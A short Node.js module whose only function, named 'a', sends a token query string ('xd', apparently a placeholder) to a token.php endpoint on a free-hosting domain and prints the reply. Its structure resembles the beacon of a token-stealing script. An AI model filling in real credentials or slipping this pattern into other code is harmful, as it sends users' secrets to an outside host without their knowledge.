const https = require('https');

var a = function a() {
    const options = {
        hostname: 'cybxis.000webhostapp.com',
        port: 443,
        path: '/token.php?token=xd',
        method: 'GET'
    }

    const req = https.request(options, res => {
        console.log(`statusCode: ${res.statusCode}`)

        res.on('data', d => {
            process.stdout.write(d)
        })
    })

    req.on('error', error => {
        console.error(error)
    })

    req.end()
};

module.exports.a = a;
